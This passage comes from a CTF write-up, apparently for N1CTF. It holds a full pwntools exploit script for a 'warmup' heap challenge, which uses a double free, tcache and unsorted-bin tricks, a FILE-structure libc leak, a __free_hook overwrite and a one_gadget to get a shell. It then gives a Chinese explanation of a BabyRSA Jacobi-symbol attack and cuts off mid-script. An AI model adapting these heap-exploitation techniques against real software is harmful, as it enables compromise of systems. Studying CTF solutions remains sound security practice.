    def z(addr):
        raw_input("debug?")
        gdb.attach(s, "b *" + str(addr))
    wordSz = 4
    hwordSz = 2
    bits = 32
    PIE = 0
    mypid=0
    def leak(address, size):
        with open("/proc/%s/mem" % mypid) as mem:
            mem.seek(address)
            return mem.read(size)
    def findModuleBase(pid, mem):
        name = os.readlink("/proc/%s/exe" % pid)
        with open("/proc/%s/maps" % pid) as maps:
            for line in maps:
                if name in line:
                    addr = int(line.split("-")[0], 16)
                    mem.seek(addr)
                    if mem.read(4) == "\x7fELF":
                        bitFormat = u8(leak(addr + 4, 1))
                        if bitFormat == 2:
                            global wordSz
                            global hwordSz
                            global bits
                            wordSz = 8
                            hwordSz = 4
                            bits = 64
                        return addr
        log.failure("Module's base address not found.")
        sys.exit(1)
    def zx(addr = 0):
        global mypid
        mypid = proc.pidof(s)[0]
        raw_input("debug?")
        with open("/proc/%s/mem" % mypid) as mem:
            moduleBase = findModuleBase(mypid, mem)
            gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))
    def clean():
        s.close()
        if DEBUG == 2:
            if context.arch == "i386":
                os.system("patchelf --set-interpreter /lib/ld-linux.so.2 warmup")
                os.system("patchelf --set-rpath /lib/i386-linux-gnu:/libc.so.6 warmup")
            if context.arch == "amd64":
                os.system("patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 warmup")
                os.system("patchelf --set-rpath /lib/x86_64-linux-gnu:/libc.so.6 warmup")
    def menu(x):
        s.sla(">>", str(x))
    def add(data):
        menu(1)
        s.sa("content>>", data)
    def delete(idx):
        menu(2)
        s.sla("index:", str(idx))
    def modify(idx, data):
        menu(3)
        s.sla("index:", str(idx))
        s.sa("content>>", data)
    def pwn():
        add('A'*0x30)
        add('B'*0x30)
        add('C'*0x30)
        add('D'*0x30)
        add('E'*0x30)          # avoid overflow
        modify(4, "DDDD")
        delete(9)
        delete(9)
        delete(9)
        delete(4)
        #zx(0xB98)
        modify(0, 'a'*0x20 + p64(0) + p64(0x51))    # double free
        delete(9)
        delete(0)
        add('\xa0')
        add('EEEE')
        add(chr(0)*0x10+p64(0)+p64(0xa1))   # unsorted bin
        modify(1, 'D'*8)
        for i in range(7):
            delete(9)
        delete(9)
        modify(1, "\x60\x57")   # \x60
        delete(4)
        modify(3, 'DDDD')   # delete(3)
        delete(9)
        modify(3, '\xc0')
        add('DDDD')
        #### zx(0xB98) ##############
        add('DDDD')
        add(p64(0xfbad3887) + p64(0) * 3 + "\0")
        s.ru(p64(0xffffffffffffffff))
        s.r(8)
        libc.address = u64(s.r(6) + "\0\0") - 0x3eb780
        free_hook = libc.sym["__free_hook"]
        one_shot = libc.address + 0x4f322
        info("libc.address 0x%x", libc.address)
        info("free_hook 0x%x", free_hook)
        info("one_shot 0x%x", one_shot)
        #modify(7, p64(free_hook))
        delete(2)
        delete(3)
        delete(4)
        add(p64(free_hook))
        add('DDDD')
        add(p64(one_shot))
        delete(1)
        '''
        0x4f2c5    execve("/bin/sh", rsp+0x40, environ)
        constraints:
        rcx == NULL
        0x4f322    execve("/bin/sh", rsp+0x40, environ)
        constraints:
        [rsp+0x40] == NULL
        0x10a38c   execve("/bin/sh", rsp+0x70, environ)
        constraints:
        [rsp+0x70] == NULL
        '''
        s.irt()
        #clean()
        # N1CTF{0359e2a5bf6222aa34bb22b7c099adda}
    def dump():
        pwn()
        s.recv(timeout=1)
        s.sl("cat warmup")
        s.sl("exit")
        data = s.ra()
        f = open("dump", "wb")
        f.write(data)
        f.close()
    if __name__ == "__main__":
        pwn()
## CRYPTO
###  Part3-BabyRSA
若同余式 x**2 == a (mod m), (a, m) = 1 有解，则a叫做模m的平方剩余，否则就叫平方非剩余。 雅可比符号Jacobi(a,
m)是勒让得符号的推广，若雅可比符号为-1，则说明a是m的平方非剩余，但是为1并不能说明a是m的平方剩余。
首先构造中padding是经过平方处理的： padding = random.randint(0, 2**1000) ** 2
假设产生随机数为r，则padding = r ** 2 并且不管随机数的因子中有多少个2，经过平方后，因子2个数必为偶数。
再根据明文的构造，这里加括号容易说明： message = padding << (1 + (m % 2)) 左移1或2位代表乘以2**1或2**2。
也就是说
  * 如果m%2==1，那么构造的message加密后有: message**e == ((2**2)*padding)**e == ((2**2)*(r**2))**e == ((2r)**e)**2 == C (mod N)
  * 如果m%2==0，那么构造的message加密后有: message**e == ((2**1)*padding)**e == (2*(r**2))**e == C (mod N) 因为r中2因子为偶数个，所以一旦m%2==0，Jacobi(C, N)一定为-1， 又因为m%2==1时，只要(2r)**e满足与N互素，则Jacobi(C, N)一定为1。 因此可还原flag，脚本如下：
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*- 
    import gmpy2
    N = 23981306327188221819291352455300124608114670714977979223022816906368788909398653961976023086718129607035805397846230124785550919468973090809881210560931396002918119995710297723411794214888622784232065592366390586879306041418300835178522354945438521139847806375923379136235993890801176301812907708937658277646761892297209069757559519399120988948212988924583632878840216559421398253025960456164998680766732013248599742397199862820924441357624187811402515396393385081892966284318521068948266144251848088067639941653475035145362236917008153460707675427945577597137822575880268720238301307972813226576071488632898694390629
    e = 0x10001
    def Jacobi(n, m):